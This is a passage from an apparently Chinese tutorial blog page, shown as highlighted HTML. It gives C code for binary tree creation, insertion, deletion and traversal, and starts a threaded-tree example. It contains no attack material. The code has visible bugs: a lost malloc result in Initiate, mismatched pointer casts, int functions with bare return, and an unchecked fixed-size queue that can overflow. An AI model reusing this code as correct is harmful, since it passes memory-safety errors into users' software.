class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXNODE 10</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> Elemtype ;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiTreeNode</span></span><br><span class=\"hljs-class\">&#123;</span><br>    Elemtype data;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiTreeNode</span> *<span class=\"hljs-title\">lchild</span>,*<span class=\"hljs-title\">rchild</span>;</span><br>&#125; BiTreeNode,*BiTree;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiTreeParNode</span></span><br><span class=\"hljs-class\">&#123;</span><br>    Elemtype data;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiTreeParNode</span> *<span class=\"hljs-title\">lchild</span>,*<span class=\"hljs-title\">rchild</span>,*<span class=\"hljs-title\">parent</span>;</span><br>&#125; BiParTreeNode,*BiParTree;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Initiate</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>((T=(BiTreeNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    T-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    T-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">CreateTree</span><span class=\"hljs-params\">(Elemtype x)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiTree *)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">return</span> p;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">InsertTreeLeftNode</span><span class=\"hljs-params\">(BiTree T,Elemtype x,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a parent.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiTree*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">if</span>(parent-&gt;lchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        parent-&gt;lchild=p;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        p-&gt;lchild=parent-&gt;lchild;<br>        parent-&gt;lchild=p;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Insert data %d to leftchild.\\n&quot;</span>,x);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">InsertTreeRightNode</span><span class=\"hljs-params\">(BiTree T,Elemtype x,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a parent.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiTree*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">if</span>(parent-&gt;rchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        parent-&gt;rchild=p;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        p-&gt;rchild=parent-&gt;rchild;<br>        parent-&gt;rchild=p;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Insert data %d to rightchild.\\n&quot;</span>,x);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">DeleteTreeLeftNode</span><span class=\"hljs-params\">(BiTree T,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>||parent-&gt;lchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No left child.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p=parent-&gt;lchild;<br>    parent-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-built_in\">free</span>(p);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">DeleteTreeRightNode</span><span class=\"hljs-params\">(BiTree T,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>||parent-&gt;rchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No left child.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p=parent-&gt;rchild;<br>    parent-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-built_in\">free</span>(p);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">PreOrderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    Visit(T-&gt;data);<br>    PreOrderTree(T-&gt;lchild);<br>    PreOrderTree(T-&gt;rchild);<br><br>&#125;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">MiddleOrderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    MiddleOrderTree(T-&gt;lchild);<br>    Visit(T-&gt;data);<br>    MiddleOrderTree(T-&gt;rchild);<br><br>&#125;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">LastOrderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    LastOrderTree(T-&gt;lchild);<br>    LastOrderTree(T-&gt;rchild);<br>    Visit(T-&gt;data);<br><br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">LevelOrderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    BiTree Queue[MAXNODE];<br>    <span class=\"hljs-type\">int</span> front,rear;<br><br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    front=<span class=\"hljs-number\">-1</span>;<br>    rear=<span class=\"hljs-number\">-1</span>;<br>    Queue[++rear]=T;<br>    <span class=\"hljs-keyword\">while</span>(front!=rear)<br>    &#123;<br>        Visit(Queue[++front]-&gt;data);<br>        <span class=\"hljs-keyword\">if</span>(Queue[front]-&gt;lchild!=<span class=\"hljs-literal\">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;lchild;<br>        &#125;<br>        <span class=\"hljs-keyword\">if</span>(Queue[front]-&gt;rchild!=<span class=\"hljs-literal\">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Visit</span><span class=\"hljs-params\">(Elemtype data)</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%3d&quot;</span>,data);<br>&#125;<br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    BiTree myTree;<br>    Elemtype rootData;<br>    <span class=\"hljs-type\">int</span> numberOfNodes,index,choice;<br><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the node number:\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;numberOfNodes);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the data of root node:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;rootData);<br><br>    myTree=CreateTree(rootData);<br><br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">1</span>; index&lt;numberOfNodes; index++)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No %d node&#x27;s position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root&#x27;s leftchild.\\n4.Rightchild of the Root&#x27;s leftchild.\\n5.Leftchild of the Root&#x27;s rightchild.\\n6.Rightchild of the Root&#x27;s rightchild.\\n&quot;</span>,index);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Choice:&quot;</span>);<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;choice);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the %d data:&quot;</span>,index);<br>        Elemtype nodedata;<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;nodedata);<br>        <span class=\"hljs-keyword\">switch</span>(choice)<br>        &#123;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">1</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">2</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">3</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">4</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">5</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">6</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Preorder:&quot;</span>);<br>    PreOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Middleorder:&quot;</span>);<br>    MiddleOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Postorder:&quot;</span>);<br>    LastOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Leverorder:&quot;</span>);<br>    LevelOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-线索二叉树的基本操作\"><a href=\"#2-线索二叉树的基本操作\" class=\"headerlink\" title=\"2.线索二叉树的基本操作\"></a>2.线索二叉树的基本操作</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXNODE 10</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> Elemtype ;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiThrTreeNode</span></span><br><span class=\"hljs-class\">&#123;</span><br>    Elemtype data;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiThrTreeNode</span> *<span class=\"hljs-title\">lchild</span>;</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiThrTreeNode</span> *<span class=\"hljs-title\">rchild</span>;</span><br>    <span class=\"hljs-type\">unsigned</span> ltag:<span class=\"hljs-number\">1</span>;<br>    <span class=\"hljs-type\">unsigned</span> rtag:<span class=\"hljs-number\">1</span>;<br>&#125; BiThrTreeNode,*BiThrTree;<br><br>BiThrTree pre;<br><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Visit</span><span class=\"hljs-params\">(Elemtype data)</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%3d&quot;</span>,data);<br>&#125;<br><br><br>BiThrTree <span class=\"hljs-title function_\">CreateTree</span><span class=\"hljs-params\">(Elemtype x)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiThrTree *)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiThrTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    